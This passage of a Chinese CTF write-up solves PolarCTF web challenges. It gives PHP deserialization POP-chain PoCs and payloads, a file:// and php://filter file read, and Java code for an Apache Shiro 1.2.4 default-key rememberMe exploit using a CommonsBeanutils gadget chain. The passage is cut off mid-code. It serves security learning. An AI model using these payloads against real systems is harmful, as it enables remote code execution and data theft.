<br></code></pre></td></tr></table></figure><p>入题点是file_get_contents，读文件。gameFile属性改成&#x2F;flag</p><p>PlayGame::__toString里会调用openGame方法。</p><p>PlayGame::__destruct会自动执行，如果让name是一个Object，那么就会调用__toString方法。</p><p>首先$this-&gt;user得是一个User类的对象，这里面才有name。</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlayGame</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gameFile</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlayGame</span>();<br><span class="hljs-variable">$a</span>-&gt;user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;user-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlayGame</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>最后的非法参数：如果前面有中括号，会先把中括号转化成下划线，后面的非法部分保持原样，所以payload：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">?</span><span class="hljs-variable">polar</span><span class="hljs-punctuation">[</span><span class="hljs-variable">flag</span><span class="hljs-operator">.</span><span class="hljs-variable">flag</span><span class="hljs-operator">=</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;PlayGame&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;user&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;name&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;PlayGame&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;user&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;gameFile&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;age&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;sex&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">N</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">8</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;gameFile&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">5</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430165010871.png" alt="image-20240430165010871"></p><h1 id="csdn"><a href="#csdn" class="headerlink" title="csdn"></a>csdn</h1><p>开局一个xxs&#x3D;网址</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">?xxs=<span class="hljs-keyword">file</span>:<span class="hljs-comment">///flag.txt</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;funs.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">myWaf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>有文件包含点，先看看funs.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=funs.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;f1@g.php&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myWaf</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/f1@g/i&quot;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NONONONON0!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A-&gt;&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;a . <span class="hljs-string">&quot;destruct!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$str_array</span>= <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$str_array</span>[<span class="hljs-string">&#x27;kfc&#x27;</span>]-&gt;vm50;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Crazy Thursday&quot;</span>.<span class="hljs-variable">$str2</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$kfc</span></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable language_">$this</span>-&gt;c[<span class="hljs-variable">$kfc</span>];<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$$f</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag在C::__get方法里，最后会输出$$f，所以我们需要$f&#x3D;flag，最后才会输出$flag，所以c[$kfc]要为flag。</p><p>在B:: __toString方法里<code>$str2 = $str_array[&#39;kfc&#39;]-&gt;vm50;</code>会调用__get，而访问不存在的属性触发的__get方法的属性值就是__get方法的参数值，这里就是$kfc，所以$kfc为vm50。我们在$c这个数组里就可以写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;vm50&quot;</span>=&gt;<span class="hljs-string">&quot;flag&quot;</span>);<br></code></pre></td></tr></table></figure><p>同时我们需要b数组里的kfc的值是C类的对象。</p><p>A::__destruct()会调用B:: __toString()</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;vm50&quot;</span>=&gt;<span class="hljs-string">&quot;flag&quot;</span>);<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$a</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;a-&gt;b[<span class="hljs-string">&#x27;kfc&#x27;</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430171338437.png" alt="image-20240430171338437"></p><p>payload：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">?</span><span class="hljs-variable">file</span><span class="hljs-operator">=</span><span class="hljs-variable">f1</span><span class="hljs-operator">@</span><span class="hljs-variable">g</span><span class="hljs-operator">.</span><span class="hljs-variable">php</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">data</span><span class="hljs-operator">=</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;B&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">3</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;kfc&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">O</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;C&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;c&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">a</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;vm50&quot;</span><span class="hljs-operator">;</span><span class="hljs-variable">s</span><span class="hljs-operator">:</span><span class="hljs-number">4</span><span class="hljs-operator">:</span><span class="hljs-string">&quot;flag&quot;</span><span class="hljs-operator">;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="PHP-Deserialization"><a href="#PHP-Deserialization" class="headerlink" title="PHP_Deserialization"></a>PHP_Deserialization</h1><p>好多反序列化&#x3D;-&#x3D;</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Polar</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$night</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$night_arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;night-&gt;<span class="hljs-title function_ invoke__">hacker</span>(<span class="hljs-variable">$this</span>-&gt;night_arg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Night</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong call:&quot;</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;  arg:&quot;</span> . <span class="hljs-variable">$arguments</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Day</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;filename;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;polar&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;polar&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>入题点还是file_get_contents函数，只不过把flag变成空了，我们双写绕过即可。</p><p>Night::__call会调用Day::__toString，Polar::__wakeup()里会调用Night::__call</p><p>__call($name, $arguments)方法的两个参数分别是错误的方法名和方法接受的属性，这里错误的方法名是hacker，属性就是night_arg，这个我们可控。</p><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Polar</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$night</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$night_arg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Night</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Day</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flflagag&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Polar</span>();<br><span class="hljs-variable">$a</span>-&gt;night = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Night</span>();<br><span class="hljs-variable">$a</span>-&gt;night_arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Day</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">polar=Tz<span class="hljs-meta">o1</span>OiJQb<span class="hljs-number">2</span>xhciI<span class="hljs-number">6</span>Mjp<span class="hljs-number">7</span>cz<span class="hljs-meta">o1</span>OiJuaWdodCI<span class="hljs-number">7</span>Tz<span class="hljs-meta">o1</span>OiJOaWdodCI<span class="hljs-number">6</span>MDp<span class="hljs-number">7</span>fX<span class="hljs-name">M6</span>OToibml<span class="hljs-symbol">naHRfYXJnIjtPOjM6</span>IkRheSI<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>cz<span class="hljs-meta">o4</span>OiJmaWxlbmFtZSI<span class="hljs-number">7</span>cz<span class="hljs-meta">o5</span>OiIvZmxmbGF<span class="hljs-symbol">nYWciO319</span><br></code></pre></td></tr></table></figure><h1 id="PolarOA"><a href="#PolarOA" class="headerlink" title="PolarOA"></a>PolarOA</h1><p>在登录界面尝试登录并抓包查看信息，发现<code>rememberMe</code>的特征字符串，可猜测考察<code>shiro</code>反序列化的利用。</p><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240430182024038.png" alt="image-20240430182024038"></p><p>我们知道低版本shiro的反序列化漏洞是因为其cookie是AES加密的，而密钥是固定的，所以会导致任意cookie注入。就会导致反序列化漏洞。所以我们的第一步肯定是找到密钥。</p><p>后发现是<code>shiro 1.2.4</code>默认的<code>key</code>：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p>那我们可以尝试直接打CB无CC依赖的链：</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB_no_CC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">Beancomparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, Beancomparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(Beancomparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);  <span class="hljs-comment">//property赋值为TemplatesImpl的outputProperties属性</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<span class="hljs-comment">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象</span><br>        setFieldValue(Beancomparator, <span class="hljs-string">&quot;comparator&quot;</span>, String.CASE_INSENSITIVE_ORDER);<br>        OutputCookieWithKey(queue,<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">OutputCookieWithKey</span><span class="hljs-params">(Object eval,String shiro_key)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(eval);<br>        <span 